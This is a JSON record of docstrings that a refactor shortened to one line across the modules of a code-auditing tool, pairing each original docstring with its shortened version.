    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Fetch keyword argument by name from AST call.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Fetch keyword argument by name from AST call.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Helper: Extract list/tuple of string constants as comma-separated string.\n\n    Internal helper - duplicated across framework extractor files for self-containment.\n    \"\"\"",
    "truncated": "\"\"\"Helper: Extract list/tuple of string constants as comma-separated string.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract ALL assignment patterns from TypeScript semantic AST, including destructuring.\n\n    CRITICAL FIX: Now uses line-based scope mapping for accurate function context.\n    \"\"\"",
    "truncated": "\"\"\"Extract ALL assignment patterns from TypeScript semantic AST, including destructuring.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Build CFG for a single TypeScript function using AST traversal.\n\n    This properly traverses the AST instead of using string matching.\n    \"\"\"",
    "truncated": "\"\"\"Build CFG for a single TypeScript function using AST traversal.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract symbols from TypeScript semantic AST including property accesses.\n\n    This is a helper used by multiple extraction functions.\n    \"\"\"",
    "truncated": "\"\"\"Extract symbols from TypeScript semantic AST including property accesses.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract tag name from JSX element node.\n\n    Handles various JSX element structures to extract the tag name.\n    \"\"\"",
    "truncated": "\"\"\"Extract tag name from JSX element node.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Analyze React.createElement call to determine if it's a component.\n\n    Components have capital letters or are passed as references.\n    \"\"\"",
    "truncated": "\"\"\"Analyze React.createElement call to determine if it's a component.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract class definitions from TypeScript semantic AST.\n\n    PHASE 2: Rewritten to use single-pass AST traversal instead of filtered symbols.\n    \"\"\"",
    "truncated": "\"\"\"Extract class definitions from TypeScript semantic AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract export statements from TypeScript semantic AST.\n\n    Currently returns empty list - exports aren't extracted by semantic parser yet.\n    \"\"\"",
    "truncated": "\"\"\"Extract export statements from TypeScript semantic AST.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Query repo_index.db for decorator-based entry points.\n\n        NO FALLBACK - crashes if table missing (Phase 0 verified it exists).\n        \"\"\"",
    "truncated": "\"\"\"Query repo_index.db for decorator-based entry points.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Query repo_index.db for framework-specific entry points.\n\n        NO FALLBACK - crashes if tables missing.\n        \"\"\"",
    "truncated": "\"\"\"Query repo_index.db for framework-specific entry points.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Query symbols table for file's symbol count.\n\n        NO FALLBACK - crashes if query fails.\n        \"\"\"",
    "truncated": "\"\"\"Query symbols table for file's symbol count.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Close database connections.\n\n        Call this when done to release resources.\n        \"\"\"",
    "truncated": "\"\"\"Close database connections.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"\n    Normalize package name to PyPI standards (PEP 503).\n    Converts 'PyYAML' -> 'pyyaml', 'My-Package.Cool' -> 'my-package-cool'\n    \"\"\"",
    "truncated": "\"\"\"Normalize package name to PyPI standards (PEP 503).\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"\n    Check if a cached item is still valid based on age.\n    Default is 24 hours for dependency version checks.\n    \"\"\"",
    "truncated": "\"\"\"Check if a cached item is still valid based on age.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Group findings by their containing function.\n\n        Uses symbols table to find function boundaries.\n        \"\"\"",
    "truncated": "\"\"\"Group findings by their containing function.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Extract the literal conditions from source that define this execution path.\n\n        Returns factual code conditions, not interpretations.\n        \"\"\"",
    "truncated": "\"\"\"Extract the literal conditions from source that define this execution path.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Correlate findings based on shared execution paths in CFG.\n\n    Reports structural facts about control flow relationships, not interpretations.\n    \"\"\"",
    "truncated": "\"\"\"Correlate findings based on shared execution paths in CFG.\"\"\""
  },
  {
    "file": "theauditor/graphql/querier.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"GraphQL Querier - Query GraphQL metadata from database.\n\nStub implementation for querying GraphQL types, fields, and resolver mappings.\n\"\"\"",
    "truncated": "\"\"\"GraphQL Querier - Query GraphQL metadata from database.\"\"\""
  },
  {
    "file": "theauditor/graphql/visualizer.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"GraphQL Visualizer - Generate visual representations of GraphQL schemas.\n\nStub implementation for visualizing GraphQL execution graphs.\n\"\"\"",
    "truncated": "\"\"\"GraphQL Visualizer - Generate visual representations of GraphQL schemas.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Flush JWT patterns batch (special dict-based interface).\n\n        KEPT FOR BACKWARD COMPATIBILITY: add_jwt_pattern uses dict format.\n        \"\"\"",
    "truncated": "\"\"\"Flush JWT patterns batch (special dict-based interface).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add an import style name record directly to the batch.\n\n        Used by _store_import_style_names handler for flat junction array from JS.\n        \"\"\"",
    "truncated": "\"\"\"Add an import style name record directly to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add a function parameter to the batch.\n\n        Schema: func_params(file, function_line, function_name, param_index, param_name, param_type)\n        \"\"\"",
    "truncated": "\"\"\"Add a function parameter to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add a function decorator to the batch.\n\n        Schema: func_decorators(file, function_line, function_name, decorator_index, decorator_name, decorator_line)\n        \"\"\"",
    "truncated": "\"\"\"Add a function decorator to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add a function decorator argument to the batch.\n\n        Schema: func_decorator_args(file, function_line, function_name, decorator_index, arg_index, arg_value)\n        \"\"\"",
    "truncated": "\"\"\"Add a function decorator argument to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add a function parameter decorator to the batch (NestJS @Body, @Param, etc).\n\n        Schema: func_param_decorators(file, function_line, function_name, param_index, decorator_name, decorator_args)\n        \"\"\"",
    "truncated": "\"\"\"Add a function parameter decorator to the batch (NestJS @Body, @Param, etc).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add a class decorator to the batch.\n\n        Schema: class_decorators(file, class_line, class_name, decorator_index, decorator_name, decorator_line)\n        \"\"\"",
    "truncated": "\"\"\"Add a class decorator to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add a class decorator argument to the batch.\n\n        Schema: class_decorator_args(file, class_line, class_name, decorator_index, arg_index, arg_value)\n        \"\"\"",
    "truncated": "\"\"\"Add a class decorator argument to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add an assignment source variable to the batch.\n\n        Schema: assignment_source_vars(file, line, target_var, source_var, var_index)\n        \"\"\"",
    "truncated": "\"\"\"Add an assignment source variable to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add a return source variable to the batch.\n\n        Schema: return_source_vars(file, line, function_name, source_var, var_index)\n        \"\"\"",
    "truncated": "\"\"\"Add a return source variable to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add an import specifier to the batch.\n\n        Schema: import_specifiers(file, import_line, specifier_name, original_name, is_default, is_namespace, is_named)\n        \"\"\"",
    "truncated": "\"\"\"Add an import specifier to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add a Sequelize model field to the batch.\n\n        Schema: sequelize_model_fields(file, model_name, field_name, data_type, is_primary_key, is_nullable, is_unique, default_value)\n        \"\"\"",
    "truncated": "\"\"\"Add a Sequelize model field to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/security_database.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Add JWT pattern detection.\n\n        KEPT FOR BACKWARD COMPATIBILITY: Uses dict-based interface.\n        \"\"\"",
    "truncated": "\"\"\"Add JWT pattern detection.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/docker.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return list of file extensions this extractor supports.\n\n        Note: Dockerfiles don't have extensions, we match by filename.\n        \"\"\"",
    "truncated": "\"\"\"Return list of file extensions this extractor supports.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"\nResolution logic for JavaScript/TypeScript analysis.\nContains post-processing methods that operate on the SQLite database.\n\"\"\"",
    "truncated": "\"\"\"Resolution logic for JavaScript/TypeScript analysis.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/prisma.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Return list of file extensions this extractor supports.\n\n        Prisma schemas don't have a specific extension, match by filename.\n        \"\"\"",
    "truncated": "\"\"\"Return list of file extensions this extractor supports.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/rust.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Get or create tree-sitter parser for Rust.\n\n        Lazy initialization to avoid import overhead if not used.\n        \"\"\"",
    "truncated": "\"\"\"Get or create tree-sitter parser for Rust.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/rust.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Clean up resources.\n\n        tree-sitter doesn't require cleanup, but method provided for interface compatibility.\n        \"\"\"",
    "truncated": "\"\"\"Clean up resources.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Store Python loops (for/while/async_for/complexity_analysis).\n\n        Uses two-discriminator pattern: loop_kind (table) + loop_type (extractor subtype).\n        \"\"\"",
    "truncated": "\"\"\"Store Python loops (for/while/async_for/complexity_analysis).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Store Python branches (if/match/raise/except/finally).\n\n        Uses two-discriminator pattern: branch_kind (table) + branch_type (extractor subtype).\n        \"\"\"",
    "truncated": "\"\"\"Store Python branches (if/match/raise/except/finally).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Store advanced Python function patterns (generator/async/lambda/context_manager/recursive/memoized).\n\n        Uses two-discriminator pattern: function_kind (table) + function_type (extractor subtype).\n        \"\"\"",
    "truncated": "\"\"\"Store advanced Python function patterns (generator/async/lambda/context_manager/recursive/memoized).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Store Python I/O operations (file/network/database/process/param_flow/closure/nonlocal/conditional).\n\n        Uses two-discriminator pattern: io_kind (table) + io_type (extractor subtype).\n        \"\"\"",
    "truncated": "\"\"\"Store Python I/O operations (file/network/database/process/param_flow/closure/nonlocal/conditional).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Store Python state mutations (instance/class/global/argument/augmented).\n\n        Uses two-discriminator pattern: mutation_kind (table) + mutation_type (extractor subtype).\n        \"\"\"",
    "truncated": "\"\"\"Store Python state mutations (instance/class/global/argument/augmented).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Store Python class features (metaclass/slots/abstract/dataclass/enum/etc).\n\n        Two-discriminator pattern: feature_kind (table discriminator) + feature_type (extractor subtype preserved)\n        \"\"\"",
    "truncated": "\"\"\"Store Python class features (metaclass/slots/abstract/dataclass/enum/etc).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Store Python descriptors (property/cached_property/dynamic_attr/etc).\n\n        Two-discriminator pattern: descriptor_kind (table discriminator) + descriptor_type (extractor subtype preserved)\n        \"\"\"",
    "truncated": "\"\"\"Store Python descriptors (property/cached_property/dynamic_attr/etc).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Store Python Literal/Overload types.\n\n        Two-discriminator pattern: literal_kind (table discriminator) + literal_type (extractor subtype preserved)\n        \"\"\"",
    "truncated": "\"\"\"Store Python Literal/Overload types.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"\n    Train the three models with optional sample weighting for human feedback\n    and probability calibration.\n    \"\"\"",
    "truncated": "\"\"\"Train the three models with optional sample weighting for human feedback\"\"\""
  },
  {
    "file": "theauditor/insights/ml/models.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"\n    Train the three models with optional sample weighting for human feedback\n    and probability calibration.\n    \"\"\"",
    "truncated": "\"\"\"Train the three models with optional sample weighting for human feedback\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Decorator to integrate journal writing with pipeline execution.\n\n    This decorator wraps pipeline functions to automatically write journal events.\n    \"\"\"",
    "truncated": "\"\"\"Decorator to integrate journal writing with pipeline execution.\"\"\""
  },
  {
    "file": "theauditor/manifest_parser.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"\n        Check if a package exists in dependencies and return its version.\n        Handles various dependency formats including Cargo workspace inheritance.\n        \"\"\"",
    "truncated": "\"\"\"Check if a package exists in dependencies and return its version.\"\"\""
  },
  {
    "file": "theauditor/pipeline/structures.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Context for pipeline execution.\n\n    Encapsulates configuration that flows through the pipeline.\n    \"\"\"",
    "truncated": "\"\"\"Context for pipeline execution.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Create planning tables using schema.py definitions.\n\n        Creates: plans, plan_tasks, plan_specs, code_snapshots, code_diffs, plan_phases, plan_jobs\n        \"\"\"",
    "truncated": "\"\"\"Create planning tables using schema.py definitions.\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_JSX_RULE.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Detect JSX spread operator injection: <div {...userProps} />\n\n    Spread operator can inject arbitrary props including dangerous ones.\n    \"\"\"",
    "truncated": "\"\"\"Detect JSX spread operator injection: <div {...userProps} />\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_STANDARD_RULE.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Check for direct user input flow to dangerous sinks.\n\n    Uses assignments table to track data flow.\n    \"\"\"",
    "truncated": "\"\"\"Check for direct user input flow to dangerous sinks.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Standardized output from all rules.\n\n    This replaces the various dict formats that rules previously returned.\n    \"\"\"",
    "truncated": "\"\"\"Standardized output from all rules.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Convert old RuleContext to StandardRuleContext.\n\n    Helper for dual-mode orchestrator during migration.\n    \"\"\"",
    "truncated": "\"\"\"Convert old RuleContext to StandardRuleContext.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Check if project uses threading/async/multiprocessing.\n\n        Schema: refs(src, kind, value, line)\n        \"\"\"",
    "truncated": "\"\"\"Check if project uses threading/async/multiprocessing.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find shared state modifications without locks.\n\n        Schema: assignments(file, line, target_var, source_expr, source_vars, in_function)\n        \"\"\"",
    "truncated": "\"\"\"Find shared state modifications without locks.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Check if there's exponential backoff in range.\n\n        Schema: assignments(file, line, target_var, source_expr, source_vars, in_function)\n        \"\"\"",
    "truncated": "\"\"\"Check if there's exponential backoff in range.\"\"\""
  },
  {
    "file": "theauditor/rules/secrets/hardcoded_secret_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Calculate Shannon entropy of a string.\n\n    This is a computational property that cannot be pre-indexed.\n    \"\"\"",
    "truncated": "\"\"\"Calculate Shannon entropy of a string.\"\"\""
  },
  {
    "file": "theauditor/rules/secrets/hardcoded_secret_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Check if a Base64 string decodes to a secret.\n\n    This requires runtime decoding and entropy calculation.\n    \"\"\"",
    "truncated": "\"\"\"Check if a Base64 string decodes to a secret.\"\"\""
  },
  {
    "file": "theauditor/rules/security/crypto_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Determine confidence level based on context analysis.\n\n    Uses multiple signals to determine if crypto usage is security-critical.\n    \"\"\"",
    "truncated": "\"\"\"Determine confidence level based on context analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/security/pii_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Check if identifier tokens match a PII pattern.\n\n    Uses token-based matching to avoid substring collisions.\n    \"\"\"",
    "truncated": "\"\"\"Check if identifier tokens match a PII pattern.\"\"\""
  },
  {
    "file": "theauditor/rules/security/pii_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Detect PII patterns in text using token-based matching.\n\n    Returns list of (pattern, category) tuples for all matches.\n    \"\"\"",
    "truncated": "\"\"\"Detect PII patterns in text using token-based matching.\"\"\""
  },
  {
    "file": "theauditor/rules/security/pii_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Detect if text matches any pattern from a specific set.\n\n    Returns the first matching pattern, or None.\n    \"\"\"",
    "truncated": "\"\"\"Detect if text matches any pattern from a specific set.\"\"\""
  },
  {
    "file": "theauditor/rules/security/sourcemap_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Analyze build artifacts for exposed source maps.\n\n        This MUST use file I/O because build outputs are not in the database.\n        \"\"\"",
    "truncated": "\"\"\"Analyze build artifacts for exposed source maps.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Adapter to let SQLite use Python's regex engine.\n\n    Usage in SQL: WHERE column REGEXP 'pattern'\n    \"\"\"",
    "truncated": "\"\"\"Adapter to let SQLite use Python's regex engine.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find queries on sensitive tables without tenant filtering.\n\n    FIXED: Removed checked_count break and moved migration filter to SQL.\n    \"\"\"",
    "truncated": "\"\"\"Find queries on sensitive tables without tenant filtering.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find queries accessing records by ID without tenant validation.\n\n    FIXED: Removed checked_count break and moved filters to SQL.\n    \"\"\"",
    "truncated": "\"\"\"Find queries accessing records by ID without tenant validation.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find transactions without SET LOCAL for RLS context.\n\n    FIXED: Used Anti-Join pattern to eliminate N+1 query explosion.\n    \"\"\"",
    "truncated": "\"\"\"Find transactions without SET LOCAL for RLS context.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find ORM queries without tenant filtering using orm_queries table.\n\n    FIXED: Removed checked_count break, used LEFT JOIN to eliminate N+1 queries.\n    \"\"\"",
    "truncated": "\"\"\"Find ORM queries without tenant filtering using orm_queries table.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find bulk INSERT/UPDATE/DELETE operations without tenant field.\n\n    FIXED: Removed checked_count break and moved all filters to SQL.\n    \"\"\"",
    "truncated": "\"\"\"Find bulk INSERT/UPDATE/DELETE operations without tenant field.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find JOINs between tables without tenant field in ON clause.\n\n    FIXED: Removed checked_count break and moved filters to SQL.\n    \"\"\"",
    "truncated": "\"\"\"Find JOINs between tables without tenant field in ON clause.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find subqueries on sensitive tables without tenant filtering.\n\n    FIXED: Removed checked_count break and moved filters to SQL.\n    \"\"\"",
    "truncated": "\"\"\"Find subqueries on sensitive tables without tenant filtering.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_injection_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Adapter to let SQLite use Python's regex engine.\n\n    Usage in SQL: WHERE column REGEXP 'pattern'\n    \"\"\"",
    "truncated": "\"\"\"Adapter to let SQLite use Python's regex engine.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Adapter to let SQLite use Python's regex engine.\n\n    Usage in SQL: WHERE column REGEXP 'pattern'\n    \"\"\"",
    "truncated": "\"\"\"Adapter to let SQLite use Python's regex engine.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find DELETE statements without WHERE clause.\n\n    FIXED: Moved WHERE/TRUNCATE checks to SQL (was hiding bugs with LIMIT).\n    \"\"\"",
    "truncated": "\"\"\"Find DELETE statements without WHERE clause.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find SELECT queries without LIMIT that might return large datasets.\n\n    FIXED: Moved LIMIT/aggregate checks to SQL (was hiding bugs with LIMIT).\n    \"\"\"",
    "truncated": "\"\"\"Find SELECT queries without LIMIT that might return large datasets.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find SELECT * queries that fetch unnecessary columns.\n\n    FIXED: Moved SELECT * check to SQL with regex (handles whitespace variations).\n    \"\"\"",
    "truncated": "\"\"\"Find SELECT * queries that fetch unnecessary columns.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find database connections opened but not closed.\n\n    FIXED: Used Anti-Join pattern to eliminate N+1 query explosion.\n    \"\"\"",
    "truncated": "\"\"\"Find database connections opened but not closed.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find nested transaction starts that could cause deadlocks.\n\n    FIXED: Used window function (LEAD) to eliminate Python grouping and N+1 queries.\n    \"\"\"",
    "truncated": "\"\"\"Find nested transaction starts that could cause deadlocks.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find queries with large IN clauses that could be inefficient.\n\n    FIXED: Moved IN clause check to SQL (was hiding bugs with LIMIT 25).\n    \"\"\"",
    "truncated": "\"\"\"Find queries with large IN clauses that could be inefficient.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find queries on potentially unindexed fields (heuristic-based).\n\n    FIXED: Moved WHERE check to SQL (was hiding bugs with LIMIT 30).\n    \"\"\"",
    "truncated": "\"\"\"Find queries on potentially unindexed fields (heuristic-based).\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Find variable ID by name (may be in different file).\n\n        Tries same file first, then any file (for module variables).\n        \"\"\"",
    "truncated": "\"\"\"Find variable ID by name (may be in different file).\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Write graph to graphs.db using XGraphStore.save_custom_graph().\n\n        Converts ProvisioningNode/Edge format to XGraphStore format.\n        \"\"\"",
    "truncated": "\"\"\"Write graph to graphs.db using XGraphStore.save_custom_graph().\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"Build Terraform provisioning flow graphs from repo_index.db.\n\n    Follows DFGBuilder pattern exactly - database-first, zero fallbacks.\n    \"\"\"",
    "truncated": "\"\"\"Build Terraform provisioning flow graphs from repo_index.db.\"\"\""
  },
  {
    "file": "theauditor/utils/rate_limiter.py",
    "line": -1,
    "original_lines": 4,
    "original": "\"\"\"\n        Args:\n            delay: Minimum seconds between requests (e.g., 0.1 = 10 req/sec)\n        \"\"\"",
    "truncated": "\"\"\"Args:\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 3,
    "original": "\"\"\"\n    Find control points using graph traversal (includes interceptor edges).\n    \"\"\"",
    "truncated": "\"\"\"Find control points using graph traversal (includes interceptor edges).\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 3,
    "original": "\"\"\"\n    Fallback: Find control points using SQL BFS (no interceptor edges).\n    \"\"\"",
    "truncated": "\"\"\"Fallback: Find control points using SQL BFS (no interceptor edges).\"\"\""
  }
]